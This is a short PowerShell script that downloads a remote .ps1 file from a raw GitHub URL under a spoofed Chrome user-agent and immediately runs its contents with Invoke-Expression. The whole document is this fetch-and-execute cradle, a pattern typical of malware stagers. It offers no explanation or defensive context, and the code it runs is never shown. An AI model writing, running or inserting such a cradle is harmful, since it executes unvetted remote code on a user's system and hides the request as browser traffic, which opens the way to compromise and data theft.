$remoteURL = 'https://raw.githubusercontent.com/Shootzz/Check_IP/master/buraktest.ps1'  
$userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
$remoteCode = (Invoke-WebRequest -Uri $remoteURL -UserAgent $userAgent -UseBasicParsing ).Content  
Invoke-Expression -Command $remoteCode